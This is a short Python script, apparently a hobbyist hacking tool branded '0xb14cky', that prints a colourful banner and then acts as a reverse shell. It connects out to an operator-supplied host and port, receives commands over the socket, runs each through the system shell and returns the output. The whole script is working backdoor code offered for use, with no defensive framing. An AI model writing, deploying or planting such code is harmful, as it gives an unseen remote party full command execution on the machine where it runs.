import random
import sys
from colorama import Fore
from termcolor import colored
import argparse
import socket
import subprocess
import json

rainbow = ['red', 'green', 'green', 'blue', 'magenta', 'cyan']
r0 = random.randint(0, 5)
r1 = random.randint(0, 5)
r2 = random.randint(0, 5)
r3 = random.randint(0, 5)
r4 = random.randint(0, 5)

print(colored("\t┌────────────────────┐", rainbow[r0]))
print(colored("\t│ ┏┓┏┓┏┓┓┏┓  ┏┓┳┳┓┳┓ │", rainbow[r1]))
print(colored("\t│ ┗┓┃┃┃ ┃┫   ┃ ┃┃┃┃┃ │", rainbow[r2]))
print(colored("\t│ ┗┛┗┛┗┛┛┗┛  ┗┛┛ ┗┻┛ │", rainbow[r3]))
print(colored("\t└──────0xb14cky──────┘", rainbow[r4]))

parser = argparse.ArgumentParser(
    description="A Simple Socket CMD !!",
    formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=47)
)
parser.add_argument("-i", "--ip", help="Domain Name You Want to Scan", type=str)
parser.add_argument("-p", "--port", help="Any Specific Port", type=int)
args = parser.parse_args()

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)


def easy_send(conn, data):
    data = json.dumps(data)
    data = data.encode()
    conn.send(data)


def easy_recv(conn):
    data = ""
    while True:
        data += conn.recv(1024).decode()
        try:
            data = json.loads(data)
            return data
        except:
            continue


if args.port and args.ip:
    host = args.ip
    port = args.port

s = socket.socket()
s.connect((host, port))
while True:
    cmd = easy_recv(s)
    output = subprocess.check_output(cmd, shell=True)
    easy_send(s, output.decode())
s.close()
